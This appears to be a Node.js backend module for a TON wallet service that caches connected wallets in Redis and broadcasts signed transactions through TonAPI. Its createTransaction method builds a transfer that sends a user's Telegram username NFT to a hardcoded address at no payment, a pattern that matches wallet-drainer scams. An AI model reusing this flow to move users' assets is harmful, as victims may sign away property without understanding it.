import redis from "../utils/redis.js";
import TonWeb from "tonweb";

// 工具：TON→nanoTON（字符串）
const toNanoStr = (vTon) => TonWeb.utils.toNano(String(vTon)).toString();

// 构造 NFT 标准 transfer payload（真正的所有权转移需要用这个）
async function buildNftTransferPayloadBase64({
  newOwner,
  responseTo,
  forwardAmountTon = 0,
  forwardComment = "",
}) {
  if (typeof newOwner !== "string") {
    throw new Error(`newOwner 不是字符串: ${newOwner}`);
  }
  if (typeof responseTo !== "string") {
    throw new Error(`responseTo 不是字符串: ${responseTo}`);
  }

  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // NFT transfer op
  cell.bits.writeUint(0, 64); // query_id
  cell.bits.writeAddress(new TonWeb.utils.Address(newOwner));
  cell.bits.writeAddress(new TonWeb.utils.Address(responseTo));
  cell.bits.writeBit(0); // no custom_payload
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon)));

  const forwardPayload = new TonWeb.boc.Cell();
  if (forwardComment) {
    forwardPayload.bits.writeUint(0, 32);
    forwardPayload.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
  }
  cell.refs.push(forwardPayload);

  // 修正：await cell.toBoc()
  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

export class WalletService {
  /**
   * 连接钱包
   */
  static async connectWallet(wallet, raw) {
    try {
      // 将钱包信息存储到Redis，设置过期时间（24小时）
      const walletKey = `wallet:${wallet}`;
      await redis.set(
        walletKey,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );

      console.log("钱包连接成功，已缓存到Redis:", wallet);

      return {
        success: true,
        message: "",
        data: {
          status: "connected",
        },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /**
   * 生成交易（标准方式）
   */
  static async createTransaction(wallet, productInfo) {
    try {
      console.log("createTransaction", wallet, productInfo);
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        throw new Error("walletData not found");
      }
      const username = productInfo[2];
      const newOwnerWallet = "UQBpLklcE-q4blWYIm_oKCZodHH4Aj-n9KDv6WEMOktSh7dW";

      const res = await fetch(
        `${process.env.TONAPI_URL}/v2/dns/${username}.t.me`
      );
      const data = await res.json();
      const nftItemAddress = data?.item?.address ?? null;

      console.log(
        "createTransaction",
        username,
        newOwnerWallet,
        nftItemAddress
      );

      const payloadBase64 = await buildNftTransferPayloadBase64({
        newOwner: newOwnerWallet, // 新所有者的钱包（写入 payload）
        responseTo: wallet, // 可用你的商户/回执地址
        forwardAmountTon: 0, // 转给新所有者的随附金额（可为 0）
        forwardComment: `transfer @${username}`,
      });

      const messages = [
        {
          address: nftItemAddress, // ★ 目标是 NFT item 合约地址，不是新所有者钱包
          amount: 0, // 附带金额
          payload: payloadBase64, // 正确的 BOC（base64）
        },
      ];

      const raw = {
        type: "nft_username_transfer",
        username,
        wallet,
        nftItemAddress,
        newOwnerWallet,
        amount: 0, // 附带金额
        ts: Date.now(),
      };

      return {
        success: true,
        raw,
        messages,
      };
    } catch (error) {
      console.error("createTransaction", error);
      throw new Error(`createTransaction error`);
    }
  }

  /**
   * 广播已签名的 BOC（TonAPI）
   * @param {string} bocBase64
   */
  static async broadcastWithTonapi(wallet, bocBase64) {
    const res = await fetch(`${process.env.TONAPI_URL}/v2/sendBoc`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${process.env.TONAPI_KEY}`,
      },
      body: JSON.stringify({ boc: bocBase64 }),
    });

    const data = await res.json().catch(() => ({}));
    if (!res.ok) {
      const msg =
        data?.message || data?.error || `${res.status} ${res.statusText}`;
      throw new Error(`sendBoc failed: ${msg}`);
    }

    await redis.set(
      `boc:${wallet}`,
      0,
      JSON.stringify({
        ...data,
      })
    );

    // 一些实现会返回 tx hash 或空对象，视实例而定
    return {
      success: true,
      message: "",
      data,
    };
  }
}
